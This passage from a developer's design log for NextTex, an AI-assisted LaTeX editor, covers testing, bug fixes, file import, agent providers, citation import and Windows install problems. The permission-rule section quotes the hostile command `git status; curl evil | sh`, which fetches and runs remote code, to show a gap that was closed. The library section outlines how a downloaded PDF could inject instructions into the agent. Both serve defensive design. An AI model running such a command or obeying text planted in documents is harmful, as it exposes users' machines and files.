filled violet was the loudest thing on the page; the completion popup is
capped so it stops crossing into the preview, and is painted in `--surface-2`
like every other floating surface in the editor rather than in the page's own
`--surface`, which on a white ground left it held apart from what it floated
over by a hairline and a shadow alone; and the logo was redrawn with
one chevron instead of two two units apart, on an outlined tile: the old
mark fused into a violet smudge at 18 px, and a brand mark should not spend
the fill that means *answer the agent*.

## 14. Building the instruments, and what they found

The three audits above were done by reading code and looking at screenshots.
That is how every bug in them was found, and it is also why this section
exists: fourteen thousand lines of source were covered by nine hundred lines
of test, all of them unit tests over `nexttex/`. **Not one HTTP route was
tested, no frontend code was tested at all, and every browser check had been
a throwaway script in `/tmp`.**

Writing the plan proved the cost. Reading the app against a coverage map
turned up three bugs that broke a feature outright: changing the model
raised a 500, the sign-in screen never advanced after a successful login,
and the Console/SSO button was wired to a parameter the server does not
read. None would have survived a suite. Adversarial reading of the same code
found a dozen more, and the suite itself found several the reading missed.

### What was built

**A scripted agent.** `ProjectAgent` spawns the real `claude` CLI: slow,
costly, non-deterministic, and it needs an account. So a large part of the
app, streamed prose, edit chips with their diffs and undo, permission cards
and their shield, the follow-up queue, usage, model switching, was
untestable. `nexttex/scripted_agent.py` replays a list of steps from
`tests/scripts/*.json` through the same event queue the real one writes to.
An `edit` step performs a real write, so the version, the rebuild, the chip
and the undo all run for real; a `permission` step really does block until
somebody answers. A browser test names the script in the first line of its
question: `#script:permission`.

It has one honest limitation, and it is the one the earlier reviewer warned
about: a stand-in cannot tell you whether the real SDK still emits the
message shapes the scripts assume. That is what the `NEXTTEX_LIVE` smoke
test is for, and it is run by hand.

**API contract tests.** Every route, its documented failures, and a path
escape assertion on everything that takes one. The fixture ordering is
load-bearing: `server/main.py` builds `SETTINGS` and `REGISTRY` at *import*
time and `Settings.load()` writes a config file when it finds none, so the
environment is redirected at conftest module scope, before anything under
`server` is imported. Otherwise running the tests hands a different token to
whatever tab is open.

**A browser tier.** Each spec starts a NextTex of its own, own port, own
XDG directories, own projects, a config written before the server so the
token is known rather than scraped from a log line, and drives it against
the Chromium actually cached on the machine rather than the build number the
library expects. Every wait is on an observable: a response, a DOM state,
never a clock. The exception is written down: one spec has to prove a build
*does not* happen while an equation is unbalanced, and a negative assertion
needs a clock.

That spec is worth a paragraph, because two versions of it passed while
testing nothing. The first counted `/compile` requests -- but an ordinary
save carries `compile: true` in its own body, so the server starts the build
itself and no such request is ever made; the count stayed at zero whatever
the app did. The second watched the status dot, which does say "Compiling"
-- for the 130 milliseconds a build of a short document takes, which a poll
cannot be relied on to catch. Both passed with the debounce deliberately
disabled. The third subscribes to the event stream from the test process and
counts `compile_start`, which is the thing actually being asserted, and it
fails when the debounce is removed. The same helper is there for any spec
that needs to assert on something the page never displays.

The same rewrite turned up why the second version could not have worked
either: it clicked the editor and typed, which lands wherever the viewport
happens to be -- the preamble. `mid_construct` looks only between
`\begin{document}` and `\end{document}`, on purpose, so an unbalanced `$`
typed into the preamble is not unfinished work and never was. The spec now
puts the cursor in the body deliberately.

**A sign-in that is driven end to end.** The bug on that screen -- waiting
for an `exit` event that nothing published -- lived in the seam between a
real interactive program under a pseudo-terminal and a browser waiting on
its output. Both halves were individually correct, and a mock of either
would have had no seam to get wrong. So `tests/fake_claude.py` is a real
program, run under the real pseudo-terminal, through the real pump: it
prints a verification URL without a trailing newline the way the CLI does,
waits for a code on stdin, and reports itself signed in afterwards. The
server finds it through `NEXTTEX_CLAUDE_BINARY`, which is the whole of the
production change. Two tests then cover the flow, one over the API and one
in a browser, and both fail if the event is renamed on either side.

**Property tests** over the two places where being right for the cases
somebody thought of is not enough: the path fence, and what retention is
allowed to throw away.

**A hostile-input layer.** None of it is an attack. It is a figure with a
per cent sign in its name, a chapter pasted from Word, a project of two
thousand files, a directory that went read-only because something was
syncing it, a disk that filled up.

**Benchmarks**, on demand, against a project shaped like a thesis: forty
source files, two megabytes of LaTeX, a populated build directory, a `.git`
with a working tree. The thresholds are budgets, not records.

### The bugs that mattered

**Two windows on one project destroyed each other's work.** `PUT /file` was
whole-file last-writer-wins with nothing watching, and the watcher's own
"this was us" suppression meant the second tab was never even told a save
had happened, so its autosave wrote a stale buffer over everything the
first had written, silently, with the tab still showing clean. A save now
carries a tag for what the browser last agreed the file said, is refused
rather than believed when the file has moved on, and is broadcast to every
other tab. The refusal is a banner offering both copies.

That tag was got wrong twice before it was right. A float second was far too
coarse: saves land a quarter of a second apart, and any slack wide enough
to absorb filesystem differences was wide enough to wave the clobber
through. `st_mtime_ns` was better and still wrong: it is only as fine as the
filesystem chooses to record, and two writes a millisecond apart share one
on plenty of them. The test caught that by failing one run in three. It is a
hash of the contents now, which answers the real question anyway.

Closing the loop found one more: history collapses an editing burst into a
single version, and both windows are "you", so the tab that saved second
replaced the other tab's version and the text it had overwritten was gone
from the history as well as from the file. A burst now only collapses within
the window that made it.

**A server restart killed every open tab, silently.** Forty-two routes
required a project to be open, including the event stream, so after a
restart the browser retried a 404 every two seconds forever with nothing on
screen saying so. "Open" is what a user does to a window, not a
precondition the server keeps: `session_for` opens a registered project on
demand, and only the open route marks one as recently opened.

**The preview zooms with the wheel and with a pinch.** Ctrl with the wheel,
or two fingers on a trackpad, which every browser reports as a wheel event
with `ctrlKey` set. Two things make it more than ten lines. The listener has
to be a native, non-passive one: React registers `wheel` passively on its
root, so `preventDefault` inside `onWheel` is ignored and the browser zooms
the whole application instead of the document. And a gesture must not
relayout the document sixty times a second: each page is a canvas sized by
its container, so the handler resizes the containers, which rescales what is
already drawn at the right scroll extents, and the crisp redraw runs once,
140 ms after the gesture stops. The point under the pointer stays under the
pointer, and the range is the one the zoom buttons already offered.

**A file created through the API never appeared in the tree.** A save
broadcasts `structural: False` so that a keystroke burst in one window does
not cost every other window a full tree request. Creating a file went
through the same line, so the new name was not in any open tab's tree until
somebody reloaded the page -- the file existed, was being edited, and could
not be reached. The broadcast now says structural when the file was not
there before. Found by a browser spec written for something else entirely,
which is the argument for the tier.

**A reload lost your place.** Not a bug, and it read as one. NextTex now
comes back to the document with the same files open and the same one in
front, and leaving for the project list is remembered just as deliberately.

**Ctrl-F did nothing**, on the first press. `searchKeymap` was bound
without the `search()` extension that provides the panel, and CodeMirror
installs the missing field in the same transaction that asks to show it, so
the field never sees the effect. The second press worked. A LaTeX editor
with no find and replace, one line away from having it.

**"Always allow" was wider than it looked.** The rule was scoped to a Bash
command's first word, which is only honest for a command that has one:
`git status; curl evil | sh` starts with `git`, so `Bash:git` covered it for
good. A command carrying shell syntax now gets no rule at all, is asked
about every time, and the card does not offer to remember it.

**The compile was doing work three times over.** Every build fired
`/symbols`, `/words` and `/git`, a full project rescan, a `texcount`
subprocess and a `git status`: inline on the single event loop, every 1.6
seconds while somebody typed. During those, the server answered nothing at
all: no autosave, no streamed token, no PDF. The symbol cache was worse than
slow: its stamp walk counted `.pdf` files and skipped only `.git` and
`.nexttex`, so `build/main.pdf` moved the stamp on every compile and the
whole project was rescanned every time. The benchmark keeps a guard on
exactly that: if it comes back, `symbols.after_build_ms` goes from about one
millisecond to about twenty.

**Secondary text on the third surface was unreadable**, 4.22:1 in the light
theme and 4.33:1 in the dark, against a 4.5:1 requirement. This has now been
got wrong twice and caught by eye both times, which is not a method. The
palette is parsed out of `styles.css` and every pairing the app uses is
measured, in both themes, in under a second.

### What the accessibility pass changed

axe-core over six states in both themes found four things, all of them the
app's own markup rather than a library's.

The document was an ARIA textbox with no name, so the one region of this app
that holds the writing was announced as an unlabelled input. It has a name
now.

The file tabs claimed `role="tab"` without a `tablist` around them, and each
tab contained its own close button: a control inside a control, announced
as one thing and reached as two. The fix was not to add the missing role: an
ARIA tablist promises arrow-key navigation between tabs and a panel
associated with each one, and this strip has neither, so claiming it would
tell a screen reader something untrue. The tabs are a labelled group of
buttons, the close button is a sibling rather than a child, and the open
file is marked with `aria-current`.

One rule is consciously rejected and written into the spec with its reason:
`scrollable-region-focusable` wants CodeMirror's scroller to be focusable
itself, when the focusable editable region inside it *is* how a keyboard
reaches and scrolls the document. Satisfying it literally would add a tab
stop that goes nowhere.

Beyond axe there are four checks it cannot make: that Escape closes what it
opens, that the composer is reachable by tabbing out of the editor, and that
the permission card's three answers are real buttons with real names, the
one control in this app where a mistaken click runs a command.

### Where the line is

Worth its maintenance: anything that asserts a contract, anything that
guards a safety property, path escape, atomic write, undo refusal, the
permission fence, history permanence: anything that encodes a bug already
paid for, and the handful of browser specs that prove the core loop still
works end to end.

Not worth it: snapshot tests of rendered React, which fail on every
intentional design change and assert nothing about behaviour; a second
browser spec for a variation the first already covers; tests that assert an
exact duration rather than a budget; and anything a unit test can pin down.
Every timing constant in the browser tier is a reason to prefer the layer
below it.

---

## 15. Making files, and putting files in

Everything above assumed files arrive somehow. They did, by drag-and-drop onto a row, or
through a menu hanging off one, and the assumption held right up until somebody needed a
folder in a project that had one file in it.

The work in this section came from a design consult, and two of its decisions are worth
keeping the reasoning for.

**The file picker opens before the destination chooser.** The obvious order is to ask where
the files should go and then open the picker. It is wrong: it costs two deliberate steps
before a file has even been chosen, every single time, including the overwhelmingly common
case where the answer is the same folder as last time. Opening the picker first means the
chooser appears *already knowing the filenames*, so "where do these go" and "one of these
is already there" become one question on one surface, instead of a two-page wizard. It also
means the chooser can decline to appear at all, which is what it does for a drop onto a
folder with no collisions: the gesture named the destination, so there is nothing to ask.

**A replacement is `op="replace"`, not an edit.** This looks like bookkeeping and is the
thing that keeps the feature honest. History collapses same-author edits inside ninety
seconds, which is right for typing and catastrophic here: export a plot, notice the axes are
wrong, export again inside a minute, and the coalescer merges the two replacements: keeping
the intermediate and dropping the version that held the *original* figure, which is the one
version the whole feature exists for. The coalescing test requires `previous.op == "edit" ==
op`, so a distinct op closes it by construction rather than by a special case. It is
deliberately *not* permanent: thinning a year of nightly re-exports is correct, and a
version somebody names is already permanent by its label.

Underneath both: replacing a figure used to destroy it. The route recorded a version by
reading the file as UTF-8 inside a `try` that swallowed the `UnicodeDecodeError`, so it
worked for a chapter and silently did nothing for a PNG. The blob store had never had
trouble with arbitrary bytes, `content()`'s `errors="replace"` decode had, which is right
for showing an old draft in an editor and turns every invalid byte of an image into U+FFFD.
There is a `bytes_of` beside it now, a `raw=1` form of the blob route that serves a version
with its own media type, and a read-only pane for files the editor cannot hold, without
which a figure's history is unreachable, since the only route to any file's history is to
make it the active document.

**And an old version opens in that pane, not in the panel.** For a while it opened as a
180 px thumbnail inside a 264 px column, and a PDF figure did not open at all, because the
panel drew its preview from an `img`, so the one format figures are kept in precisely
because it scales was the one that could not be looked at. The pane takes the bytes it is
to show rather than deriving them from the path; the path still decides which viewer to
reach for and what to call the file, because a version of a PNG is a PNG. Which of the two
ways a version opens is therefore a question about the file rather than about the version:
a picture or a PDF goes to the pane, and what still opens in place is a version this
machine does not hold, which has nothing to show anywhere, and a file neither viewer can
draw, where the honest offer is the download.

Two bugs turned up while building it, both in code that predated it. Creating anything at
the project root put a naming input under *every* file in the project, each one stealing
focus from the last, and the blur that follows cancelled it, the row hosting the input
compared a file's parent to `""` instead of only ever hanging off a folder. And the folder
list's arrow keys collapsed the list, because selecting an option and confirming the choice
were the same callback; selection has to follow focus with the list still open, or the
keyboard path is one keystroke long and ends in the wrong place.

What was added beyond the ask, and why each earns its place: the project root became a drop
target, because dropping a file at the root was previously impossible; a file that lands in
a collapsed folder is now revealed, expanded and flashed, because from the writer's seat it
had otherwise not landed; typing in the tree jumps to a file, which is the reason there is
no filter box in a bar 240 px wide; `Move to…` reuses the same folder chooser and the rename
route, which already fenced both of its paths; and an image pasted onto the tree becomes a
figure with a dated name, because screenshot-to-figure is a loop somebody runs all
afternoon.

---

## 16. Three agents, one of which is none

The agent was Claude, and the app was built around it closely enough that
"which model" looked like a setting nobody would ever need. Two things
changed that. Not everybody has a Claude account. And more importantly: a
writer who does not want an AI anywhere near their manuscript is not a lapsed
user of this app, they are its core user with one panel switched off.

So there are three providers, and the third is `none`.

**The seam already existed.** `ScriptedAgent` had been standing in for the
whole agent since the test suite was built, which is a stronger claim than
it looks: it proved the rest of the app depends on exactly eleven members:
`ask`, `events`, `busy`, `idle_seconds`, `disconnect`, `interrupt`,
`current_why`, `resolve_permission`, `set_model`, `model`, `usage`. Adding a
second real provider was writing a fourth implementation of a contract that
had already been exercised, not carving a new abstraction out of coupled
code.

**The OpenAI one is narrower on purpose, and the narrowing is the safety.**
The Claude SDK offers Bash, so that agent has to fence it: a permission
card, a rule scoped to the command's first word, a refusal to remember
anything for a compound command. Here the tool list is ours to write, so
there is no shell on it: a writing agent has never needed one except to
run the build, which is a tool of its own. And every path a tool takes is
resolved against the project root, so there is no out-of-project write to
ask permission about. `resolve_permission` returns `False` and says why,
rather than keeping a card that would never appear.

It has never spoken to OpenAI. There is no account here, so the transport
is stubbed and everything above it runs for real. What that cannot tell you
is whether OpenAI still returns these shapes, which is the same honest
limit the Anthropic side has and the reason `NEXTTEX_LIVE` exists.

**"None" removes the column rather than disabling it.** A greyed-out panel
down the right-hand side is a permanent advertisement for a decision the
writer already made. The editor and the preview take the width.

### The error pane had to grow up first

Switching the agent off exposed how much of the app's helpfulness was
routed through it. The error drawer showed what TeX said, and `Fix` wrote
that into the composer, which is no help at all to somebody with no
composer.

`nexttex/explain.py` is twenty-three rules over the errors that actually
happen, each with what it means and what to look for. `Missing $ inserted`
becomes *Maths outside maths mode* and *put the expression between dollar
signs, or write `\_` if you meant a literal underscore*.

The part worth defending is the summary strip. TeX cascades: one unclosed
brace produces a complaint from every paragraph after it, and the list in
the drawer is sorted with errors first, so a reader who works down it
spends the evening fixing consequences. The strip names the *first* error
in document order, nearly always the cause, and says plainly that the
rest usually follow from it. That is a sentence, not a feature, and it is
the most useful thing in the pane.

---

## 17. A folder of papers, and the citation that is never invented

Point NextTex at a directory of PDFs and it fills in the bibliography. The
rule that makes it worth having is the same rule that makes it hard: a
citation may never be composed from anything but a publisher's own record.

**Bulk import is where that rule is most tempting to soften.** A hundred
PDFs, ninety of them carrying a printed DOI, and a title search would
"probably" get the rest. It does not, and the refusals are written into the
design rather than left to the implementation: no DOI is guessed from a
title, no filename that looks close is trusted, and there is no *add all
suggestions* button, twelve individual clicks is the correct cost of
twelve papers that had no DOI printed in them.

**The safeguard that is not obvious.** A DOI printed on page one is
sometimes a DOI the paper *cites*. So after the record comes back, its
title is checked against the paper's own front matter, and a record that
does not describe the paper it was found in is refused. The check is folded
token containment rather than a substring or a similarity ratio, because
`pdftotext` hyphenates at line ends: `nitro-\nphenol` folds to `nitro
phenol` and a substring test would reject a paper that is unambiguously
right.

**Duplicates, at three scopes.** A DOI already in the file. The same file
content under two collections, caught by hashing the bytes before anything
is extracted, which is also what makes re-running the same folder cost
seconds. And, the one that would have been silently wrong, **citation keys
colliding inside a single run**: two papers by the same author in the same
year both become `Marcus1993`, and the second shadows the first in every
`\cite` without LaTeX complaining. The growing `.bib` text is threaded
through each lookup so the disambiguator sees the entry added a moment ago.

**Why this is not a `ProjectContext` document.** That mechanism copies the
bytes, lists every document in the system prompt on every turn, and exists
to distil things. All three are wrong for two hundred papers: the copy is
600 MB of duplication, the listing would be two hundred lines paid for on
every turn, and there is no useful distillation of a literature collection.
The operation you want is *search*. So the library indexes the text that
had to be extracted anyway and contributes a fixed four lines to the
prompt, whatever its size.

**The path fence is not involved, extended, or excepted.** `Project.resolve`
answers one question, can this client-supplied relative path escape the
project it names, and it keeps answering only that. A Zotero folder is not
in the project and never will be. What guards the browse route instead:
it is read-only, it returns folder names and PDF counts and never file
contents, it does not follow symlinks, and **no tool the agent can call
reaches it**. A PDF is a file the writer downloaded from the internet, and
a tool that turned "read this folder" into an argument the model chooses
would be a path from a downloaded paper to the writer's home directory.

For the same reason, what `search_library` returns is framed as quotation
rather than instruction, and snippets are capped so no long instruction
block survives intact.

## 18. Two installs, updating from the page, and a size the reader chooses

Three things, and each one turned on a fact that had to be measured rather
than reasoned about.

### Why the interface size is a `zoom`

The type scale is fixed pixels and so is the geometry around it: `h-[28px]`
controls, `h-[26px]` rows, `w-[264px]` cards. Scaling only the type would put
21px text in a 28px control. So the interface size scales the whole
composition: `zoom` on `#root`, which is the parent of *every* view, including
the loading, sign-in and project-list screens that return before the editor
shell is ever built. One line covers all of them, with nothing threaded
through `App`.

Editor text is the opposite case and gets the opposite mechanism: one CSS
variable on `.cm-scroller`, with a **unitless** line height so it tracks the
size. A fixed `22px` under 21px text is unreadable. The gutter follows at the
ratio it had at the default.

**Weight is a second variable, and the page it is drawn on gets a vote.**
Dark type on a bright ground looks thinner than light type on a dark one at
the same weight, the ground bleeds into the strokes rather than the strokes
into the ground, so a monospace face set at 400 that is right in the dark is
spindly on white. `--nx-editor-weight-lift` is that compensation, and it is a
**palette** token (100 in `.nx-theme-light`, 0 in `.nx-theme-dark`) rather
than a rule keyed on the theme, for the same reason `--on-pen` is one: the
editor can be handed one palette while the app is in the other, and a rule
that asks the *root* what theme it is gets the wrong answer inside that. The
three papers inherit it by being applied together with `.nx-theme-light`. It
is the same move, in the same direction and for the same reason, as the
`--ink-3` lift the papers already make: a thing that is measurably identical
can still be perceptually lighter, and the palette is where that is
corrected.

Settings → Editor weight is the writer saying the compensation went too far
or not far enough. Three stops, and three is all there is room for: the face
is five static weights rather than a variable one, so the steps are 100 apart
or they are nothing; a light page spends one of them before the writer sees
it; and a control sequence is set 200 above the prose. So the top stop is
already 600 prose and a command at the 700 ceiling on a white page, and a
fourth at 600 would put 700 prose there: a face with its counters filling
in, under a command that can no longer outweigh it. 300/400/500 reaches
300–600 for prose and 500–700 for a command, and that is the whole of the
usable range.

Two consequences worth stating. The stops are **named**, Lighter, Normal,
Bolder: rather than numbered, like the preview quality's and unlike the two
size rows above them: "Regular" would be a lie on four of the six editor
grounds, where the palette has already added a step. And the command weight
had to stop being a hard-coded 600, in the `.nx-syn-*` rules and in
`latexHighlight` alike, because the prose can now reach 600 itself: on a white
page at the heaviest setting the source would have gone flat, and the subtle
mode has nothing but weight to tell a command from a word.

**`zoom` leaves the app straddling two coordinate spaces, and the two halves
are not symmetrical.** Measured in Chrome at 150% rather than assumed:

- **Reads are in viewport pixels.** `getBoundingClientRect()` on an element
  inside the zoomed subtree returns 900 for something whose own `left` is
  600px. `MouseEvent.clientX` and `window.innerWidth` agree with it, so reads
  can safely be compared with one another.
- **Writes are in zoomed pixels.** `style.left = "600px"` on a fixed element
  inside the subtree renders at viewport 900.

So the bug is never in the reading. It is in taking something read and either
writing it back as a style, or comparing it against a literal from the
stylesheet, both of which live in zoomed space. `viewport.ts` holds the
conversion; eight sites use it. The rule for new code: **convert once, at
capture**, so anything stored in state is already in the space a style is read
in. Converting again at the point of use double-counts, which is exactly the
bug that arises when the capture and the use are in different files.

Two consequences that are easy to miss:

- The preview would have gone soft. Its canvas is sized from
  `devicePixelRatio`, which `zoom` does not change, and *nothing invalidated
  it*, a scale change is not a relayout. The resolution is read per render
  and an appearance event marks the pages stale.
- Container queries need no help. `Status.tsx` and the `@[208px]:` rules in
  `Chat.tsx` measure their container in its own scaled space, so a larger
  interface drops optional segments sooner. That is correct: bigger text does
  leave less room.

Ctrl-wheel over the editor steps the text size, mirroring the preview's own
gesture, and, like it, the listener must be native, because React registers
`wheel` passively and `preventDefault` inside `onWheel` is ignored. There are
deliberately **no** Ctrl-plus/minus bindings: the browser owns those, they are
what a reader reaches for first, and browser zoom already scales this app
correctly. Taking the keys away to do a worse version of what they already do
is a net loss.

Theme, interface size and editor size live behind one button in the rail
header. The theme costs a second click; in exchange the related controls fit a
32px header at its narrowest width. The trigger was `Aa` while the surface held
three typographic controls, and is a cog now that the same surface also decides
whether the document compiles as you type: a cog is what people look for when
the thing they want is not on screen anywhere else. Neither is the sun and moon
that came before both, because that glyph already means *switch the theme*, and
making it open a menu instead would break a meaning the app had taught.

What it opens is a sheet rather than a popover. Thirteen rows in a 248 px column
is a preferences window pretending to be a menu, and the length was the smaller
half of the problem: rows answering to entirely different things, how this
machine looks, how this project builds, who may open this install: sat in one
undifferentiated stack, and nothing said which of those travelled with the
project. It is two columns of named groups now, each with the subtitle it
needed, and "Kept in the project, not on this computer" is the sentence that
had nowhere to live.

### Which commits count as an update

NextTex is always a git checkout, no package, no version string, so "is
there an update" is a question about `git`. The interesting half is the second
question. Most commits to a project like this one change documentation or
tests, and telling somebody every session that three commits exist when none
of them changes the program they are running is a nag rather than a service.

Every commit is classified by the paths it touches: `frontend/` is
*interface*; `docs/`, `README.md`, `LICENSE`, `tests/`, `e2e/`, `bench/` and
`examples/` are *neither*; everything else, **including anything
unrecognised**, is *app*. Failing towards "something changed" is the right
direction: a wrong "nothing to see here" costs more than a wrong alarm.
`scripts/` counts as app because it changes what the *next* update does.

The label and the rebuild question are **separate fields**, which was learned
the hard way. Reading "does the bundle need rebuilding" off the single label
meant a commit touching a Python module *and* a React component came back
"app" with `rebuild` false: new server code installed behind the interface
that was already built, which is the exact failure the check exists to
prevent.

The screen fires the check after it has rendered and never awaits it, and the
fetch gets a ten-second timeout of its own rather than the module's 120: a
fetch with no route to the network would otherwise hang for two minutes on the
screen the writer opens every session. A check nobody asked for is silent when
it fails; an install on an offline tailnet must not open onto a red line every
morning.

**Asked and unasked are two different questions, and setting an update aside
only answers one of them.** `Not now` writes `head:behind` into this browser's
storage and the card stops appearing, which is right for the check that runs
when the screen opens and was wrong for everything else. The test was applied to
the render rather than to the check, so it also swallowed every result the
writer had pressed a button for: the request went out, the server answered past
its own cache, and the answer was discarded on the way to the screen. The button
visibly did nothing, and since the key only moves when upstream gains a commit,
it went on doing nothing. The dismissal is scoped to an unasked check now, which
is the same distinction the failure path four lines above it already makes.

**And the line it leaves says what it knows.** It used to read `Check for
updates`, which is indistinguishable from never having checked. An update put
off until a quieter afternoon has to leave something on screen to come back to,
so the dismissed state reads *"An update is waiting."* with a `Show it` beside
it: `--ink-3` at `micro`, the same grey line the docs-only case uses, which is a
fact rather than an alarm. `Not now` keeps the report rather than discarding it,
which is what lets that line exist, and marks it unasked, so a dismissal and a
reload arrive at the same branch by construction rather than by coincidence.

### Restarting, and why it is a nonce

`serve()` keeps its `uvicorn.Server` objects as locals and `main.py` holds no
reference to them, so **no route can ask for a graceful shutdown**. The exit
*is* the restart: systemd's `Restart=on-failure` and launchd's
`KeepAlive.SuccessfulExit=false` both bring a service back after a non-zero
exit and leave it down after a clean one. Windows registers a logon task,
which is not a supervisor, so there the writer is told to start it again.
Supervision is detected from `INVOCATION_ID` or `XPC_SERVICE_NAME`.

The page then polls for a **boot nonce**, regenerated once per process, not
for the commit sha. The question being asked is "did a different process
answer", not "did the code change": an update that pulls nothing still
restarts, and waiting for a sha that never moves would time out for no reason.
A tab that *joins* a running update starts that poll immediately rather than
waiting for the stream to end, because the stream replays the output collected
so far but not the `done` event, a tab arriving after the job finished would
otherwise wait for a message that has already been and gone.

**An inherent property worth knowing: the code that performs an update is the
old code.** A bug in the updater is therefore only fixed one update later.
That is not a design choice and cannot be avoided; it is a reason to keep this
path small and to test it against a real service, which the browser tier
cannot do: it spawns the server itself, with no supervisor, so a non-zero
exit simply kills it.

### Two installs on one machine

One environment variable, `NEXTTEX_INSTANCE`. Unset is the ordinary install
and nothing changes. Set, it moves the state directory aside
(`~/.local/share/nexttex-dev`), names the service `nexttex-dev`, and derives a
default port from the name, because two NextTex both defaulting to 8450 means
the second refuses to start with a message about a port rather than about what
the person was doing. The name is validated as a single path segment: it is a
label, never a way out of the directory.

A named instance carries a badge in the rail, on the project list and in the
tab title, in `--warn` rather than the accent, because it is a caution rather
than a feature. The ordinary install shows nothing: almost every install is
the only one on its machine, and a badge reading "the normal one" is noise.

### The install line that stopped on its own options

Reported from a Windows machine, one line in: `irm ... /install.ps1 | iex`
answered with "the attribute cannot be added because variable Tex with value
would no longer be valid", and nothing was installed.

`iex` has no script file to bind parameters against. It runs the `param`
block in the caller's scope, where each entry becomes a variable with an
attribute attached rather than a parameter with a default, and a
`ValidateSet` that forbids its own default is then an attribute that cannot
be applied to the value sitting in the variable. `-Tex` was simply the first
of three.

What makes it worth writing down is that it held for months by accident. The
only validated option used to be `-Bind`, and its default was `localhost`,
which is a member of its own set. Adding `-Tex` and `-Agent` and giving all
three an empty default broke a rule nobody knew was being kept. The empty
string is now a member of each set, since the empty string is what "not
answered yet" means here.

The check for it lives in the cross-platform tests rather than the
PowerShell ones, because the PowerShell tests skip on the machine this is
written on and this is a Windows-only failure. A `pwsh` test runs the real
prologue too, in CI, with everything after the `param` block cut off so that
testing the install does not perform one.

### Two more things the same Windows machine found

With the options fixed, that install ran to the end and printed a URL, and
two of its steps had failed on the way past without stopping it.

**TinyTeX ships a wrapper that cannot work.** We fetched
`install-bin-windows.bat`, which is four lines whose entire job is to fetch
`install-bin-windows.ps1` and run it. It fetches it with `curl.exe -fsSLO
'https://...'`, and cmd.exe does not strip single quotes, so curl was handed
a URL starting with one and answered "URL using bad/illegal format". The
next line then ran a script that had never been downloaded, and the line
after deleted it. Three errors, no TeX, and the install carried on. Nothing
here can repair somebody else's batch file, so we now fetch the script it
was reaching for.

**One cmdlet cost the whole interface.** `fetch-interface.ps1` stopped on
"the term 'Get-FileHash' is not recognized", which is what a `powershell`
older than 4.0 says. It had already downloaded the tarball and the
checksum, because `Invoke-WebRequest` is 3.0, and everything else in the
script is 3.0 as well: one call was holding the floor a version higher than
the rest of it. The .NET SHA256 class underneath is available wherever this
runs, so the checksum is computed from that instead, and the check itself
stays required rather than becoming advisory on old machines.

The test for it is worth more than the fix. A hand-rolled digest is exactly
the kind of code that returns a plausible wrong string for ever, so the
`pwsh` test compares what the function produces against Python's `hashlib`
rather than checking that it ran. Alongside it, a plain Python test refuses
any cmdlet newer than 3.0 in any shipped script, since that is a rule the
next person would otherwise have to know.

What neither of them can fix is the third failure in that log: Anthropic's
own `install.ps1` stopped on the same missing cmdlet. An old `powershell` is
a real thing on real machines, and the only honest thing to do about
somebody else's script is to say so.

### The cmdlet that was there, on a machine that could not see it

The previous entry got the cause wrong, and the way it was wrong is worth
keeping. `Get-FileHash` was missing from the install log, `Get-FileHash`
arrived in PowerShell 4.0, so the machine was old. It was not old. It runs
Windows 11 with PowerShell 7.6.5 and Windows PowerShell 5.1 side by side,
and both have the cmdlet. One missing name had been read as a version
number.

What is actually happening is that the two PowerShells use the same
variable, `PSModulePath`, for different directories. The install line is
typed into pwsh 7, so pwsh 7's module path is inherited by our Python
installer, which passes it to the `powershell.exe` it starts. 5.1 then sees
two copies of `Microsoft.PowerShell.Utility`, PowerShell 7's sorting first
because `c:\program files\powershell\7\Modules` comes before the
system32 entry, imports that one, and `Get-FileHash` is not in what it
exports.

It was settled by spawning the same child three times with only that one
variable changed: inherited, the cmdlet was missing; removed, present;
forced to 5.1's own value, present. Removing is what we do, because
PowerShell rebuilds its default when the variable is absent, so nothing
here has to know the right value for a machine it cannot see.

Three details in that finding are worth more than the fix.

**The bug is invisible by hand.** A `powershell.exe` started directly by
pwsh 7 gets a clean 5.1 module path; the pollution only arrives through an
intermediary that is not itself PowerShell. So anyone reproducing this at a
prompt sees it work, and only the installer fails. That is why it survived
three installs and two wrong diagnoses.

**`os.environ` upper-cases its keys on Windows.** `env.pop("PSModulePath")`
therefore removes nothing while looking exactly like it worked, and a first
attempt at the fix produced a convincing false negative. The comparison has
to be case-insensitive, and the test uses an upper-case key for that reason
alone.

**Three spawn sites, not one.** The installer's `Console.run` is the one
place the *install* starts a child, which is the whole design of that
module, and it is easy to read that as the only place anything is started.
It is not. The settings sheet starts the Claude CLI installer on its own,
and the in-app update button starts the updater from the server, which
inherits its environment from whatever launched the server. The first two
were corrected together; the third was found by somebody reading the fix
rather than the bug, which is the better time to find it.

The first attempt at guarding that was worse than nothing, and the way it
was wrong is the part worth keeping. It named the three files, asserted that
each mentioned `child_env` somewhere, and skipped those three in the sweep
over everything else. Both halves were weak in the same direction: the
assertion passes on an import line, and the exemption means the three files
most likely to grow a fourth spawn were the three least protected. A guard
that is inverted like that is worse than an absent one, because it reports
that the rule is being kept.

What replaced it asserts on the call rather than the file. The test parses
each source file, finds the calls that start a process, and requires
`env=child_env(...)` on every one that sits in a function naming PowerShell,
with no file exempted; the three known sites are additionally named by
function and checked call by call. The list of spawning names is wider than
what the code uses today, because the rule is about what somebody reaches
for next.

It was then checked by breaking it: with the correction deleted the guard
fails, with a fresh PowerShell spawn added inside an already-listed file it
fails, and with both restored it passes. A test written to catch a mistake
that has already been made should be made to catch it once, or it is only a
claim.

### An interactive test that was not one

Found in the same pass, on the same machine. `Test-Interactive` gated the
directory prompt on `[Environment]::UserInteractive`, which tracks the
window station rather than the keyboard: it reports true inside a child
started with its input on the null device, which is precisely where
`Read-Host` waits for an answer that can never arrive. Redirected input is
the part that means nobody can type, and it stays false in a real console
even for `irm | iex`, so both are checked now.

### An install that said Ready and had skipped the step that mattered

The verification run succeeded in sixteen seconds and exposed a different
bug on the way past, which is the best thing a verification run can do.

It ended with a note saying there was no tlmgr, so latexmk, biber, synctex,
chktex and texcount were still missing and a project using them would not
build. Both halves were false. `tlmgr.bat` and `latexmk.exe` were sitting in
a directory the installer had printed on screen two lines earlier, under
"already here".

TinyTeX does not put its bin directory on PATH. The installer knows this and
has a function to fix it, and that function was called in exactly one place:
the branch where TinyTeX had just been installed. A machine that already had
TeX skipped the whole block, so PATH was never corrected, and the question
four lines later was a bare `shutil.which`, which answered no to everything.
The install then skipped the step that would have added the four that were
genuinely absent, and exited successfully.

The irony is in the comment above that question. It explains, correctly,
that the survey's answer is stale on a fresh machine and so the question is
asked again. The survey asks it properly, consulting the TeX directory as
well as PATH. The re-ask asks it badly. Fixing the staleness had quietly
dropped the directory-aware half, which is the third time in this
investigation that one idea existed in two places and the second one was the
one that ran.

